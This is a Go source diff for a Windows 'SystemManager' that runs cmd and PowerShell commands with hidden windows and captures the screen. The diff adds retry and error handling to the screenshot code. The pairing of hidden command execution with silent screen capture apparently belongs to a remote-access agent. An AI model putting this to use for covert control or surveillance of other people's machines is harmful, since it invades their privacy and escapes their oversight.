@@ -73,7 +73,6 @@ func (sm *SystemManager) ExecuteCMD(ctx context.Context, command string) string 
 	defer cancel()
 
 	cmd := exec.CommandContext(ctx, "cmd", "/C", command)
-
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
 	output, err := cmd.CombinedOutput()
@@ -94,7 +93,6 @@ func (sm *SystemManager) ExecutePowerShell(ctx context.Context, command string) 
 	defer cancel()
 
 	cmd := exec.CommandContext(ctx, "powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", command)
-
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
 	output, err := cmd.CombinedOutput()
@@ -112,6 +110,19 @@ func (sm *SystemManager) ExecutePowerShell(ctx context.Context, command string) 
 }
 
 func (sm *SystemManager) TakeScreenshot() (string, error) {
+	var lastErr error
+	for attempt := 0; attempt < 3; attempt++ {
+		filePath, err := sm.captureScreen()
+		if err == nil {
+			return filePath, nil
+		}
+		lastErr = err
+		time.Sleep(100 * time.Millisecond)
+	}
+	return "", fmt.Errorf("screenshot failed after 3 attempts: %v", lastErr)
+}
+
+func (sm *SystemManager) captureScreen() (string, error) {
 	width, _, _ := getSystemMetrics.Call(SM_CXSCREEN)
 	height, _, _ := getSystemMetrics.Call(SM_CYSCREEN)
 
@@ -121,13 +132,13 @@ func (sm *SystemManager) TakeScreenshot() (string, error) {
 
 	hdcScreen, _, _ := getDC.Call(0)
 	if hdcScreen == 0 {
-		return "", fmt.Errorf("failed to get screen DC")
+		return "", fmt.Errorf("failed to get screen dc")
 	}
 	defer releaseDC.Call(0, hdcScreen)
 
 	hdcMem, _, _ := createCompatibleDC.Call(hdcScreen)
 	if hdcMem == 0 {
-		return "", fmt.Errorf("failed to create compatible DC")
+		return "", fmt.Errorf("failed to create compatible dc")
 	}
 	defer deleteDC.Call(hdcMem)
 
@@ -137,9 +148,11 @@ func (sm *SystemManager) TakeScreenshot() (string, error) {
 	}
 	defer deleteObject.Call(hBitmap)
 
-	selectObject.Call(hdcMem, hBitmap)
+	oldBitmap, _, _ := selectObject.Call(hdcMem, hBitmap)
+	defer selectObject.Call(hdcMem, oldBitmap) // restore old bitmap
 
-	bitBlt.Call(
+	// do the actual screen capture
+	ret, _, _ := bitBlt.Call(
 		hdcMem,
 		0, 0,
 		width, height,
@@ -148,10 +161,17 @@ func (sm *SystemManager) TakeScreenshot() (string, error) {
 		SRCCOPY,
 	)
 
+	if ret == 0 {
+		return "", fmt.Errorf("bitblt failed")
+	}
+
+	// small delay to let bitblt finish
+	time.Sleep(10 * time.Millisecond)
+
 	var bi BITMAPINFO
 	bi.BmiHeader.BiSize = uint32(unsafe.Sizeof(bi.BmiHeader))
 	bi.BmiHeader.BiWidth = int32(width)
-	bi.BmiHeader.BiHeight = -int32(height) 
+	bi.BmiHeader.BiHeight = -int32(height)
 	bi.BmiHeader.BiPlanes = 1
 	bi.BmiHeader.BiBitCount = 32
 	bi.BmiHeader.BiCompression = BI_RGB
@@ -159,7 +179,19 @@ func (sm *SystemManager) TakeScreenshot() (string, error) {
 	bufferSize := int(width) * int(height) * 4
 	buffer := make([]byte, bufferSize)
 
-	ret, _, _ := getDIBits.Call(
+	// first call to get info
+	getDIBits.Call(
+		hdcMem,
+		hBitmap,
+		0,
+		height,
+		0, // null buffer to just get info
+		uintptr(unsafe.Pointer(&bi)),
+		DIB_RGB_COLORS,
+	)
+
+	// second call to actually get the bits
+	ret, _, _ = getDIBits.Call(
 		hdcMem,
 		hBitmap,
 		0,
@@ -173,15 +205,15 @@ func (sm *SystemManager) TakeScreenshot() (string, error) {
 		return "", fmt.Errorf("failed to get bitmap bits")
 	}
 
-	// BGRA --> RGBA
+	// bgra to rgba conversion
 	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
 	for y := 0; y < int(height); y++ {
 		for x := 0; x < int(width); x++ {
 			i := (y*int(width) + x) * 4
-			img.Pix[i] = buffer[i+2]   // R
-			img.Pix[i+1] = buffer[i+1] // G
-			img.Pix[i+2] = buffer[i]   // B
-			img.Pix[i+3] = buffer[i+3] // A
+			img.Pix[i] = buffer[i+2]   // r
+			img.Pix[i+1] = buffer[i+1] // g
+			img.Pix[i+2] = buffer[i]   // b
+			img.Pix[i+3] = buffer[i+3] // a
 		}
 	}
 
